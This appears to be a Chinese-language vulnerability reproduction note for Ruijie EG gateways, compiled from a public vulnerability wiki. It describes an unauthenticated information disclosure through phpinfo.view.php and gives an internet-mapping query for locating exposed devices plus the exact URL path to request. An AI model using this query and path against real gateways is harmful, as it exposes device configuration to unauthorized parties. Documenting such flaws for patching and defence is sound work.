---
title: "锐捷 EG易网关 phpinfo.view.php 信息泄露漏洞"
date: 2026-10-18 09:16:58
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "锐捷"
tags:
  - "锐捷"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

锐捷EG易网关 部分版本 phpinfo.view.php文件权限设定存在问题，导致未经身份验证获取敏感信息

## 漏洞影响

```
锐捷EG易网关
```

## 网络测绘

```
app="Ruijie-EG易网关"
```

## 漏洞复现

查看源码发现phpinfo文件

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202110927256.png)

访问 url

```plain
/tool/view/phpinfo.view.php
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202110927015.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E9%94%90%E6%8D%B7-EG%E6%98%93%E7%BD%91%E5%85%B3-phpinfo.view.php-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md)
